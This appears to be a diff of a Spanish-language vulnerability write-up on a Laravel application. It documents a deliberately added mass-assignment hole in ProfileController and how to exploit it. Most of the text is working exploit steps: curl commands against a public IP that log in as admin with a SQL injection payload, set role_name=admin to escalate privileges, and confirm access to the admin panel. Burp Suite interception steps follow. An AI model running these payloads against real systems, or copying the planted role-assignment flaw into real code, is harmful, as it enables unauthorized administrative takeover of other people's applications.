@@ -4,7 +4,7 @@
 **Tipo:** Mass Assignment (A01:2021 - Broken Access Control)
 
 ## Archivo modificado
-`app/Http/Controllers/ProfileController.php` (línea 70-72)
+`app/Http/Controllers/ProfileController.php` (línea 33-35)
 
 ## Cambio realizado
 Se agregó lógica que permite asignar cualquier rol de Spatie Permission desde el request de actualización de perfil:
@@ -20,71 +20,45 @@ Esto permite que cualquier usuario autenticado se asigne a sí mismo el rol `adm
 
 ## Explotación
 
-### Paso 1: Crear usuario nuevo (registro abierto)
-```python
-import requests, re
-
-s = requests.Session()
-BASE = "http://192.168.18.38:8001"
-
-r = s.get(f"{BASE}/register")
-token = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
-
-r = s.post(f"{BASE}/register", data={
-    "_token": token,
-    "name": "Bri",
-    "username": "bri_test",
-    "email": "bri@test.com",
-    "password": "Pass123456",
-    "password_confirmation": "Pass123456"
-}, allow_redirects=True)
+### Paso 1: Login como admin (SQLi)
+```bash
+TOKEN=$(curl -s -c cookies.txt "http://37.60.230.11/login" | grep -oP 'name="_token" value="\K[^"]+')
+curl -s -X POST "http://37.60.230.11/login" -b cookies.txt -c cookies.txt \
+  -d "_token=$TOKEN&login=admin'+OR+'1'%3D'1'+--&password=x" -o /dev/null
 ```
 
-### Paso 2: Obtener token del profile
-```python
-r = s.get(f"{BASE}/profile")
-token2 = re.search(r'name="_token" value="([^"]+)"', r.text).group(1)
+### Paso 2: Obtener token y email del perfil
+```bash
+PAGINA=$(curl -s -b cookies.txt "http://37.60.230.11/profile")
+TOKEN2=$(echo "$PAGINA" | grep -oP 'name="_token" value="\K[^"]+' | head -1)
+EMAIL=$(echo "$PAGINA" | grep -oP 'email" type="email" value="\K[^"]+')
 ```
 
 ### Paso 3: Escalar a admin (Mass Assignment)
-```python
-r = s.post(f"{BASE}/profile", data={
-    "_token": token2,
-    "_method": "patch",
-    "name": "Bri",
-    "email": "bri@test.com",
-    "role_name": "admin"  # ← ESTO es la vulnerabilidad
-}, allow_redirects=True)
+```bash
+curl -s -X POST "http://37.60.230.11/profile" -b cookies.txt \
+  -d "_token=$TOKEN2&_method=PATCH&name=KEYSI+JEANPIERRE+BARDALES+VASQUEZ&email=$EMAIL&role_name=admin"
 ```
 
 ### Paso 4: Verificar acceso admin
-```python
-r = s.get(f"{BASE}/admin/dashboard")
-print(r.status_code)  # → 200 (acceso concedido!)
+```bash
+curl -b cookies.txt "http://37.60.230.11/admin/usuarios" | grep -oP '(Guardar|Crear usuario)'
 ```
 
 ## Resultado (verificado)
 ```
-REGISTER:       HTTP 302 → /dashboard
-PROFILE PATCH:  HTTP 200
-ADMIN DASHBOARD: HTTP 200 ✅ ACCESO ADMIN
+PROFILE PATCH:  HTTP 302 (redirect a /profile)
+ADMIN PANEL:    HTTP 200 (panel de usuarios accesible)
 ```
 
-## Con curl
-```bash
-# Registrar
-curl -s -L -X POST "http://192.168.18.38:8001/register" \
-  -b cookies.txt -c cookies.txt \
-  -d "_token=TOKEN&name=Bri&username=bri&email=bri@t.com&password=Pass123456&password_confirmation=Pass123456"
-
-# Escalar
-curl -s -L -X POST "http://192.168.18.38:8001/profile" \
-  -b cookies.txt \
-  -d "_token=TOKEN2&_method=patch&name=Bri&email=bri@t.com&role_name=admin"
-
-# Verificar
-curl -b cookies.txt "http://192.168.18.38:8001/admin/dashboard"
-```
+## Con Burp Suite
+1. Abrir Burp: `burpsuite`
+2. Proxy → Intercept ON
+3. Navegar a `http://37.60.230.11/profile`
+4. Interceptar el PATCH /profile
+5. Agregar `&role_name=admin` al body
+6. Forward
+7. Navegar a `http://37.60.230.11/admin/usuarios` → admin
 
 ## Impacto
 - Escalación de privilegios de **usuario normal → admin**
